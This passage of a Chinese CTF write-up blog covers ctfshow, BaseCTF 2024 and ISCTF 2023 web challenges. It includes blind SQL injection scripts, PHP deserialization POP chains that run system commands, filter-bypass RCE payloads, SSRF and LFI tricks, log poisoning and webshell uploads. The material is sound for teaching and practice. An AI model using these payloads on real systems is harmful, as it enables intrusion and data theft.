class="line">for i in range(40):</span><br><span class="line">    for char in uuid:</span><br><span class="line">        print(char)</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27; : passwd + f&quot;&#123;char&#125;&#x27;),0,1)&quot;,</span><br><span class="line">            &#x27;password&#x27; : 0</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        if &quot;\\u5bc6\\u7801\\u9519\\u8bef&quot; in res.text:</span><br><span class="line">            passwd += char</span><br><span class="line">            print(passwd)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>然后这个和183那个差不多，就是条件就是在路径里面查询</p><h4 id="190："><a href="#190：" class="headerlink" title="190："></a>190：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//密码检测</span><br><span class="line">if(!is_numeric($password))&#123;</span><br><span class="line">  $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//密码判断</span><br><span class="line">if($row[&#x27;pass&#x27;]==$password)&#123;</span><br><span class="line">    $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">//TODO:感觉少了个啥，奇怪</span><br></pre></td></tr></table></figure><p>这个试了试，发现使用u&#x3D;admin和p&#x3D;0时是密码错误 然后输入其他的还是有用户不存在的回显，应该是布尔盲注</p><p>然后就是用脚本跑库名，跑表名，跑列名，找到f1ag，然后猜flag</p><p>脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = &quot;http://742f0ab8-2de1-4a7e-b0ff-0b33d00fd19f.challenge.ctf.show/api/index.php&quot;</span><br><span class="line">out = &#x27;&#x27;</span><br><span class="line">for j in range(1, 50):</span><br><span class="line">    print(j)</span><br><span class="line">    for k in range(32, 128):</span><br><span class="line">        # 猜解数据库名</span><br><span class="line">        # data=&#123;</span><br><span class="line">        #     &#x27;username&#x27;: f&quot;0&#x27;||if(ascii(substr(database(),&#123;j&#125;,1))=&#123;k&#125;,1,0)#&quot;,</span><br><span class="line">        #     &#x27;password&#x27;: &#x27;1&#x27;</span><br><span class="line">        # &#125;</span><br><span class="line"></span><br><span class="line">        # 猜解表名</span><br><span class="line">        # data=&#123;</span><br><span class="line">        #     &#x27;username&#x27;: f&quot;0&#x27;||if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;j&#125;,1))=&#123;k&#125;,1,0)#&quot;,</span><br><span class="line">        #     &#x27;password&#x27;: &#x27;1&#x27;</span><br><span class="line">        # &#125;</span><br><span class="line"></span><br><span class="line">        # 猜解列名</span><br><span class="line">        # data=&#123;</span><br><span class="line">        #     &#x27;username&#x27;: f&quot;0&#x27;||if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;j&#125;,1))=&#123;k&#125;,1,0)#&quot;,</span><br><span class="line">        #     &#x27;password&#x27;: &#x27;1&#x27;</span><br><span class="line">        # &#125;</span><br><span class="line"></span><br><span class="line">        # 猜解 flag</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27;: f&quot;0&#x27;||if(ascii(substr((select f1ag from ctfshow_fl0g),&#123;j&#125;,1))=&#123;k&#125;,1,0)#&quot;,</span><br><span class="line">            &#x27;password&#x27;: &#x27;1&#x27;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        re = requests.post(url, data=data)</span><br><span class="line">        if (&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot; in re.text):</span><br><span class="line">            out += chr(k)</span><br><span class="line">            print(out)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>basectf2024web部分wp</title>
      <link href="/2025/03/18/basectf2024web%E9%83%A8%E5%88%86wp/"/>
      <url>/2025/03/18/basectf2024web%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h4 id="A-Dark-Room："><a href="#A-Dark-Room：" class="headerlink" title="A Dark Room："></a>A Dark Room：</h4><p>源码；</p><h4 id="Aura-酱的礼物："><a href="#Aura-酱的礼物：" class="headerlink" title="Aura 酱的礼物："></a>Aura 酱的礼物：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); // Aura 酱，欢迎回家~ // 这里有一份礼物，请你签收一下哟~ $pen = $_POST[&#x27;pen&#x27;]; if (file_get_contents($pen) !== &#x27;Aura&#x27;) &#123;   die(&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;); &#125; // 礼物收到啦，接下来要去博客里面写下感想哦~ $challenge = $_POST[&#x27;challenge&#x27;]; if (strpos($challenge, &#x27;http://jasmineaura.github.io&#x27;) !== 0) &#123;   die(&#x27;这不是 Aura 的博客！&#x27;); &#125; $blog_content = file_get_contents($challenge); if (strpos($blog_content, &#x27;已经收到Kengwang的礼物啦&#x27;) === false) &#123;   die(&#x27;请去博客里面写下感想哦~&#x27;); &#125; // 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~ $gift = $_POST[&#x27;gift&#x27;]; include($gift); </span><br></pre></td></tr></table></figure><p>第一步：if (file_get_contents($pen) !&#x3D;&#x3D; ‘Aura’) {   die(‘这是 Aura 的礼物，你不是 Aura！’); }  使用data伪协议</p><p>pen&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,QXVyYQ&#x3D;&#x3D;</p><p>第二步：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$challenge = $_POST[&#x27;challenge&#x27;]; if (strpos($challenge, &#x27;http://jasmineaura.github.io&#x27;) !== 0) &#123;   die(&#x27;这不是 Aura 的博客！&#x27;); &#125; </span><br></pre></td></tr></table></figure><p>ssrf的题，进行@截断</p><p>第三步：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (strpos($blog_content, &#x27;已经收到Kengwang的礼物啦&#x27;) === false) &#123;   die(&#x27;请去博客里面写下感想哦~&#x27;); &#125; // 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~ $gift = $_POST[&#x27;gift&#x27;]; include($gift); </span><br></pre></td></tr></table></figure><p>使用filter协议读取源代码</p><p>gift&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>然后base64解密就行了</p><h4 id="ez-ser："><a href="#ez-ser：" class="headerlink" title="ez_ser："></a>ez_ser：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); error_reporting(0); class re&#123;   public $chu0;   public function __toString()&#123;     if(!isset($this-&gt;chu0))&#123;       return &quot;I can not believes!&quot;;     &#125;     $this-&gt;chu0-&gt;$nononono;   &#125; &#125; class web &#123;   public $kw;   public $dt;   public function __wakeup() &#123;     echo &quot;lalalla&quot;.$this-&gt;kw;   &#125;   public function __destruct() &#123;     echo &quot;ALL Done!&quot;;   &#125; &#125; class pwn &#123;   public $dusk;   public $over;   public function __get($name) &#123;     if($this-&gt;dusk != &quot;gods&quot;)&#123;       echo &quot;什么，你竟敢不认可?&quot;;     &#125;     $this-&gt;over-&gt;getflag();   &#125; &#125; class Misc &#123;   public $nothing;   public $flag;   public function getflag() &#123;     eval(&quot;system(&#x27;cat /flag&#x27;);&quot;);   &#125; &#125; class Crypto &#123;   public function __wakeup() &#123;     echo &quot;happy happy happy!&quot;;   &#125;   public function getflag() &#123;     echo &quot;you are over!&quot;;   &#125; &#125; $ser = $_GET[&#x27;ser&#x27;]; unserialize($ser); ?&gt; </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class re&#123;</span><br><span class="line">    public $chu0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class web &#123;</span><br><span class="line">    public $kw;</span><br><span class="line">    public $dt;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class pwn &#123;</span><br><span class="line">    public $dusk;</span><br><span class="line">    public $over;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Misc &#123;</span><br><span class="line">    public $nothing;</span><br><span class="line">    public $flag;</span><br><span class="line">&#125;</span><br><span class="line">$a = new web();</span><br><span class="line">$b = new re();</span><br><span class="line">$c = new pwn();</span><br><span class="line">$d = new Misc();</span><br><span class="line">$a -&gt; kw = $b;</span><br><span class="line">$b -&gt; chu0 = $c;</span><br><span class="line">$c -&gt; dusk = &#x27;gods&#x27;;</span><br><span class="line">$c -&gt; over = $d;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><p>直接出来了；</p><h4 id="md5绕过欸："><a href="#md5绕过欸：" class="headerlink" title="md5绕过欸："></a>md5绕过欸：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);error_reporting(0);require &#x27;flag.php&#x27;;if (isset($_GET[&#x27;name&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;name2&#x27;]) &amp;&amp; isset($_POST[&#x27;password2&#x27;]) )&#123;  $name = $_GET[&#x27;name&#x27;];  $name2 = $_GET[&#x27;name2&#x27;];  $password = $_POST[&#x27;password&#x27;];  $password2 = $_POST[&#x27;password2&#x27;];  if ($name != $password &amp;&amp; md5($name) == md5($password))&#123;    if ($name2 !== $password2 &amp;&amp; md5($name2) === md5($password2))&#123;      echo $flag;    &#125;    else&#123;      echo &quot;再看看啊，马上绕过嘞！&quot;;    &#125;  &#125;  else &#123;    echo &quot;错啦错啦&quot;;  &#125;&#125;else &#123;  echo &#x27;没看到参数呐&#x27;;&#125;</span><br></pre></td></tr></table></figure><p>一个弱比较一个强比较</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=QNKCDZO&amp;name2[]=1</span><br><span class="line">password=240610708&amp;password2[]=2</span><br></pre></td></tr></table></figure><h4 id="flag直接读取不就行了？："><a href="#flag直接读取不就行了？：" class="headerlink" title="flag直接读取不就行了？："></a>flag直接读取不就行了？：</h4><p>学会了新东西：</p><p>K&#x3D;DirectoryIterator&amp;W&#x3D;&#x2F;secret&#x2F;</p><p>这个意思是调用DirectoryIterator这个函数进行遍历secret这个文件夹</p><p>SplFileObject：<code>SplFileObject</code> 提供了面向对象的方式来读取、写入和操作文件</p><p>然后伪协议读取就行了：J&#x3D;SplFileObject&amp;H&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;secret&#x2F;f11444g.php</p><h4 id="一起吃豆豆："><a href="#一起吃豆豆：" class="headerlink" title="一起吃豆豆："></a>一起吃豆豆：</h4><p>根据提示查看前端js，发现有base64密码，直接解密出来</p><h4 id="喵喵喵´•ﻌ•"><a href="#喵喵喵´•ﻌ•" class="headerlink" title="喵喵喵´•ﻌ•&#96;:"></a>喵喵喵´•ﻌ•&#96;:</h4><p>小小RCE 直接system(cat &#x2F;flag);</p><h4 id="你听不到我的声音"><a href="#你听不到我的声音" class="headerlink" title="你听不到我的声音:"></a>你听不到我的声音:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell_exec($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure><p>这个是不会回显的，然后需要用其他方式进行外带比如重定向</p><p>cmd&#x3D;cat &#x2F;flag&gt;1.txt</p><h4 id="upload："><a href="#upload：" class="headerlink" title="upload："></a>upload：</h4><p>直接传小🐎就行了，然后蚁剑连接就行了 Ez</p><h4 id="RCEisamazingwithspace"><a href="#RCEisamazingwithspace" class="headerlink" title="RCEisamazingwithspace:"></a>RCEisamazingwithspace:</h4><p>空格绕过。简单：cmd&#x3D;tac${IFS}&#x2F;flag</p><h4 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP :"></a>Really EZ POP :</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); class Sink &#123;   private $cmd = &#x27;echo 123;&#x27;;   public function __toString()   &#123;     eval($this-&gt;cmd);   &#125; &#125; class Shark &#123;   private $word = &#x27;Hello, World!&#x27;;   public function __invoke()   &#123;     echo &#x27;Shark says:&#x27; . $this-&gt;word;   &#125; &#125; class Sea &#123;   public $animal;   public function __get($name)   &#123;     $sea_ani = $this-&gt;animal;     echo &#x27;In a deep deep sea, there is a &#x27; . $sea_ani();   &#125; &#125; class Nature &#123;   public $sea;   public function __destruct()   &#123;     echo $this-&gt;sea-&gt;see;   &#125; &#125; if ($_POST[&#x27;nature&#x27;]) &#123;   $nature = unserialize($_POST[&#x27;nature&#x27;]); &#125; </span><br></pre></td></tr></table></figure><p>这个知道怎么来的。又学了一招：<code>Setword</code> 方法用于设定 <code>$word</code> 属性的值</p><p>法1：</p><?phpclass Sink{    private $cmd = 'system("ls");';    public function __toString()    {        eval($this->cmd);    }}class Shark{    private $word = 'Hello, World!';    public function Setword($setword){        $this->word =$setword;    }    public function __invoke()    {        echo 'Shark says:' . $this->word;    }}class Sea{    public $animal;    public function __get($name)    {        $sea_ani = $this->animal;        echo 'In a deep deep sea, there is a ' . $sea_ani();    }}class Nature{    public $sea;    public function __destruct()    {        echo $this->sea->see;    }}$a=new Nature();$a->sea=new Sea();$a->sea->animal=new Shark();$a->sea->animal->Setword(new Sink());echo urlencode(serialize($a));法2：通过使用 PHP 的反射机制访问和修改类的私有属性：<?phpclass Sink{    private $cmd = 'system("tac /flag");';    public function __toString() // 当对象被当做字符串时自动调用（找echo $this->a这种、strtolower()等）    {        eval($this->cmd);  // 1 system("ls");    }}class Shark{    private $word;    public function __invoke()  // 对象被当做函数进行调用时触发（找有括号的类似$a()这种）    {        echo 'Shark says: ' . $this->word;  // 2 Sink    }}class Sea{    public $animal;    public function __get($name)  // 调用类中不存在变量时触发（找有连续箭头的 this->a->b）    {        $sea_ani = $this->animal;        echo 'In a deep deep sea, there is a ' . $sea_ani();  // 3 Shark    }}class Nature{    public $sea;    public function __destruct()  // 对象被销毁时自动触发，也就是我们的链头了    {        echo $this->sea->see;  // 4 Sea    }}// 按照 1 2 3 4 的顺序编写 exp$s1 = new Sink();$s2 = new Shark();$reflection = new ReflectionClass($s2);$property = $reflection->getProperty('word');$property->setAccessible(true);$property->setValue($s2, $s1);$s3 = new Sea();$s3->animal = $s2;$n = new Nature();$n->sea = $s3;echo urlencode(serialize($n));?><p>法3：通过构造__construct()魔术方法访问 类CLASS</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Sink</span><br><span class="line">&#123;</span><br><span class="line">    private $cmd = &#x27;system(&quot;cat /flag&quot;);&#x27;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Shark</span><br><span class="line">&#123;</span><br><span class="line">    private $word = &#x27;Hello, World!&#x27;;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;word = new Sink();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Sea</span><br><span class="line">&#123;</span><br><span class="line">    public $animal;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Nature</span><br><span class="line">&#123;</span><br><span class="line">    public $sea;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = new Nature();</span><br><span class="line">$b = new Sea();</span><br><span class="line">$c = new Shark();</span><br><span class="line">$a -&gt; sea =$b;</span><br><span class="line">$b -&gt; animal = $c;</span><br><span class="line">$str = serialize($a);</span><br><span class="line">echo $str;?&gt;</span><br></pre></td></tr></table></figure><h4 id="滤个不停"><a href="#滤个不停" class="headerlink" title="滤个不停:"></a>滤个不停:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); error_reporting(0); $incompetent = $_POST[&#x27;incompetent&#x27;]; $Datch = $_POST[&#x27;Datch&#x27;]; if ($incompetent !== &#x27;HelloWorld&#x27;) &#123;   die(&#x27;写出程序员的第一行问候吧！&#x27;); &#125; //这是个什么东东？？？ $required_chars = [&#x27;s&#x27;, &#x27;e&#x27;, &#x27;v&#x27;, &#x27;a&#x27;, &#x27;n&#x27;, &#x27;x&#x27;, &#x27;r&#x27;, &#x27;o&#x27;]; $is_valid = true; foreach ($required_chars as $char) &#123;   if (strpos($Datch, $char) === false) &#123;     $is_valid = false;     break;   &#125; &#125; if ($is_valid) &#123;   $invalid_patterns = [&#x27;php://&#x27;, &#x27;http://&#x27;, &#x27;https://&#x27;, &#x27;ftp://&#x27;, &#x27;file://&#x27; , &#x27;data://&#x27;, &#x27;gopher://&#x27;];   foreach ($invalid_patterns as $pattern) &#123;     if (stripos($Datch, $pattern) !== false) &#123;       die(&#x27;此路不通换条路试试?&#x27;);     &#125;   &#125;    include($Datch); &#125; else &#123;   die(&#x27;文件名不合规 请重试&#x27;); &#125; ?&gt;</span><br></pre></td></tr></table></figure><p>这个先看看incompetent&#x3D;HelloWorld这个。然后再分析代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$required_chars = [&#x27;s&#x27;, &#x27;e&#x27;, &#x27;v&#x27;, &#x27;a&#x27;, &#x27;n&#x27;, &#x27;x&#x27;, &#x27;r&#x27;, &#x27;o&#x27;]; $is_valid = true; foreach ($required_chars as $char) &#123;   if (strpos($Datch, $char) === false) &#123;     $is_valid = false;     break;   &#125; &#125; if ($is_valid) &#123;   $invalid_patterns = [&#x27;php://&#x27;, &#x27;http://&#x27;, &#x27;https://&#x27;, &#x27;ftp://&#x27;, &#x27;file://&#x27; , &#x27;data://&#x27;, &#x27;gopher://&#x27;];   foreach ($invalid_patterns as $pattern) &#123;     if (stripos($Datch, $pattern) !== false) &#123;       die(&#x27;此路不通换条路试试?&#x27;);     &#125;   &#125;    include($Datch); </span><br></pre></td></tr></table></figure><p>让Datch里面存在’s’, ‘e’, ‘v’, ‘a’, ‘n’, ‘x’, ‘r’, ‘o’，然后过滤了一些伪协议，但是存在include,可以想想日志注入，哎，正好有&#x2F;var,什么的</p><p>Datch&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log  在UA头注入，然后rce就行了，或者蚁剑连接；</p><h4 id="复读机（ssti注入）："><a href="#复读机（ssti注入）：" class="headerlink" title="复读机（ssti注入）："></a>复读机（ssti注入）：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">被过滤的符号：+ - * / . &#123;&#123; &#125;&#125; __ : &quot; \</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>isctf2023web部分wp</title>
      <link href="/2025/03/17/isctf2023web%E9%83%A8%E5%88%86wp/"/>
      <url>/2025/03/17/isctf2023web%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h4 id="圣杯战争-："><a href="#圣杯战争-：" class="headerlink" title="圣杯战争!!!："></a>圣杯战争!!!：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); error_reporting(0); class artifact&#123;   public $excalibuer;   public $arrow;   public function __toString()&#123;     echo &quot;为Saber选择了对的武器!&lt;br&gt;&quot;;     return $this-&gt;excalibuer-&gt;arrow;   &#125; &#125; class prepare&#123;   public $release;   public function __get($key)&#123;     $functioin = $this-&gt;release;     echo &quot;蓄力!咖喱棒！！&lt;br&gt;&quot;;     return $functioin();   &#125; &#125; class saber&#123;   public $weapon;   public function __invoke()&#123;     echo &quot;胜利！&lt;br&gt;&quot;;     include($this-&gt;weapon);   &#125; &#125; class summon&#123;   public $Saber;   public $Rider;   public function __wakeup()&#123;     echo &quot;开始召唤从者！&lt;br&gt;&quot;;     echo $this-&gt;Saber;   &#125; &#125; </span><br></pre></td></tr></table></figure><p>链子：summon-&gt;artifact-&gt;prepare-&gt;saber</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class artifact&#123;</span><br><span class="line">    public $excalibuer;</span><br><span class="line">    public $arrow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class prepare&#123;</span><br><span class="line">    public $release;</span><br><span class="line">&#125;</span><br><span class="line">class saber&#123;</span><br><span class="line">    public $weapon;</span><br><span class="line">&#125;</span><br><span class="line">class summon&#123;</span><br><span class="line">    public $Saber;</span><br><span class="line">    public $Rider;</span><br><span class="line">&#125;</span><br><span class="line">$a = new summon();</span><br><span class="line">$b = new artifact();</span><br><span class="line">$c = new prepare();</span><br><span class="line">$d = new saber();</span><br><span class="line">$a -&gt; Saber = $b;</span><br><span class="line">$b -&gt; excalibuer = $c;</span><br><span class="line">$c -&gt; release = $d;</span><br><span class="line">$d -&gt; weapon = &quot;php://filter/convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><h4 id="绕进你的心里"><a href="#绕进你的心里" class="headerlink" title="绕进你的心里:"></a>绕进你的心里:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); error_reporting(0); require &#x27;flag.php&#x27;; $str = (String)$_POST[&#x27;pan_gu&#x27;]; $num = $_GET[&#x27;zhurong&#x27;]; $lida1 = $_GET[&#x27;hongmeng&#x27;]; $lida2 = $_GET[&#x27;shennong&#x27;]; if($lida1 !== $lida2 &amp;&amp; md5($lida1) === md5($lida2))&#123;   echo &quot;md5绕过了!&quot;;   if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;     die(&#x27;你干嘛?哎哟!&#x27;);   &#125;   elseif(intval($num))&#123;     if(preg_match(&#x27;/.+?ISCTF/is&#x27;, $str))&#123;       die(&quot;再想想!&quot;);     &#125;     if(stripos($str, &#x27;2023ISCTF&#x27;) === false)&#123;       die(&quot;就差一点点啦!&quot;);     &#125;     echo $flag;   &#125; &#125; ?&gt; </span><br></pre></td></tr></table></figure><p>这个首先是md5绕过，进行数组绕过，然后绕过preg_match函数再进行绕过这个：</p><p>if(preg_match(‘&#x2F;.+?ISCTF&#x2F;is’, $str)){            die(“再想想!”);        }        if(stripos($str, ‘2023ISCTF’) &#x3D;&#x3D;&#x3D; false){            die(“就差一点点啦!”);        }</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;pan[gu&#x27;: &#x27;a&#x27;*1000000 + &#x27;2023ISCTF&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(&#x27;http://gz.imxbt.cn:20215/?hongmeng[]=1&amp;shennong[]=2&amp;zhurong[]=a&#x27;,</span><br><span class="line">                    data=data, allow_redirects=False)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h4 id="Where-is-the-flag"><a href="#Where-is-the-flag" class="headerlink" title="Where is the flag:"></a>Where is the flag:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php //flag一分为3，散落在各处，分别是：xxxxxxxx、xxxx、xxx。 highlight_file(__FILE__); //标准一句话木马~ eval($_POST[1]); ?&gt;</span><br></pre></td></tr></table></figure><p>简单直接：1&#x3D;system(‘env’); 显示当前的环境变量，没想到直接出来了</p><h4 id="wafr："><a href="#wafr：" class="headerlink" title="wafr："></a>wafr：</h4><p>RCE的题，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php /* Read /flaggggggg.txt */ error_reporting(0); header(&#x27;Content-Type: text/html; charset=utf-8&#x27;); highlight_file(__FILE__); if(preg_match(&quot;/cat|tac|more|less|head|tail|nl|sed|sort|uniq|rev|awk|od|vi|vim/i&quot;, $_POST[&#x27;code&#x27;]))&#123;//strings   die(&quot;想读我文件？大胆。&quot;); &#125; elseif (preg_match(&quot;/\^|\||\~|\\$|\%|jay/i&quot;, $_POST[&#x27;code&#x27;]))&#123;   die(&quot;无字母数字RCE？大胆！&quot;); &#125; elseif (preg_match(&quot;/bash|nc|curl|sess|\&#123;|:|;/i&quot;, $_POST[&#x27;code&#x27;]))&#123;   die(&quot;奇技淫巧？大胆！！&quot;); &#125; elseif (preg_match(&quot;/fl|ag|\.|x/i&quot;, $_POST[&#x27;code&#x27;]))&#123;   die(&quot;大胆！！！&quot;); &#125; else&#123;   assert($_POST[&#x27;code&#x27;]); &#125; </span><br></pre></td></tr></table></figure><p>简单，code&#x3D;system(‘ca\t f*’)%0c</p><h4 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz!:"></a>Fuzz!:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php /* Read /flaggggggg.txt Hint: 你需要学会fuzz，看着键盘一个一个对是没有灵魂的 知识补充：curl命令也可以用来读取文件哦，如curl file:///etc/passwd */ error_reporting(0); header(&#x27;Content-Type: text/html; charset=utf-8&#x27;); highlight_file(__FILE__); $file = &#x27;file:///etc/passwd&#x27;; if(preg_match(&quot;/\`|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\\\\|\&#x27;|\&quot;|\;|\&lt;|\&gt;|\,|\?|jay/i&quot;, $_GET[&#x27;file&#x27;]))&#123;   die(&#x27;你需要fuzz一下哦~&#x27;); &#125; if(!preg_match(&quot;/fi|le|flag/i&quot;, $_GET[&#x27;file&#x27;]))&#123;   $file = $_GET[&#x27;file&#x27;]; &#125; system(&#x27;curl &#x27;.$file); </span><br></pre></td></tr></table></figure><p>新学俩个知识点：[a-z]可以绕过任意一个字母,”|”没过滤可以放在开头结束前面的curl，然后再拼接系统命令</p><p>payload:?file&#x3D;|tac &#x2F;fl[a-z]ggggggg.txt   然后还有一个:?file&#x3D;f{i}l{e}:&#x2F;&#x2F;&#x2F;fla{g}gggggg.txt  进行file:&#x2F;&#x2F;读取文件指在本地系统里面读取文件</p><h4 id="ez-ini"><a href="#ez-ini" class="headerlink" title="ez_ini:"></a>ez_ini:</h4><p>发现是文件上传，进行上传文件传.user.ini.png什么的，然后在bp里面进行改成.user.ini ,</p><p>内容：GIF89a<br>auto_prepend_file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>在UA头上面传小🐎，然后蚁剑直接连就行了；</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow中php特性上</title>
      <link href="/2025/03/16/ctfshow%E4%B8%ADphp%E7%89%B9%E6%80%A7%E4%B8%8A/"/>
      <url>/2025/03/16/ctfshow%E4%B8%ADphp%E7%89%B9%E6%80%A7%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<p>PHP特性：</p><p>89:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;   $c = $_GET[&#x27;c&#x27;];   if(!preg_match(&quot;/flag/i&quot;, $c))&#123;     eval($c);   &#125;   &#125;else&#123;   highlight_file(__FILE__); &#125;</span><br></pre></td></tr></table></figure><p>命令执行：?c&#x3D;system(‘tac fl*’);</p><p>90:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;   $num = $_GET[&#x27;num&#x27;];   if($num===&quot;4476&quot;)&#123;     die(&quot;no no no!&quot;);   &#125;   if(intval($num,0)===4476)&#123;     echo $flag;   &#125;else&#123;     echo intval($num,0);   &#125; </span><br></pre></td></tr></table></figure><p>intval:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span> ( <span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ] ) : <span class="keyword">int</span></span><br></pre></td></tr></table></figure><p><code>$var</code>：要转换为整数的变量，可以是字符串、浮点数等。</p><p><code>$base</code>：可选参数，指定转换所使用的进制，默认值是 10（十进制）</p><p>intval ($num,0)： 如果 base 是 0，通过检测 var 的格式来决定使用的进制： 如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则， 如果字符串以 “0” 开始，使用 8 进制 (octal)；否则， 将使用 10 进制 (decimal)。</p><p>这个是意思让num!&#x3D;4476,但是intval($num,0)的意思是：<code>if(intval($num,0)===4476)</code> 语句的作用是判断经过 <code>intval</code> 转换后的 <code>$num</code> 的整数值是否严格等于 <code>4476</code> ，如果是，则执行 <code>if</code> 代码块内的语句；如果不是，则跳过 <code>if</code> 代码块内的语句。</p><p>那么就可以进行进制：?num&#x3D;0x117C</p><p>91:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=$_GET[&#x27;cmd&#x27;]; if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;   if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;     echo &#x27;hacker&#x27;;   &#125;   else&#123;     echo $flag;   &#125; &#125; else&#123;   echo &#x27;nonononono&#x27;; &#125; </span><br></pre></td></tr></table></figure><p>前面正则是im,但是后面却是i:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i </span><br><span class="line">不区分(ignore)大小写</span><br><span class="line"></span><br><span class="line">m</span><br><span class="line">多(more)行匹配</span><br><span class="line">若存在换行\n并且有开始^或结束$符的情况下，</span><br><span class="line">将以换行为分隔符，逐行进行匹配</span><br><span class="line">$str = &quot;abc\nabc&quot;;</span><br><span class="line">$preg = &quot;/^abc$/m&quot;;</span><br><span class="line">preg_match($preg, $str,$matchs);</span><br><span 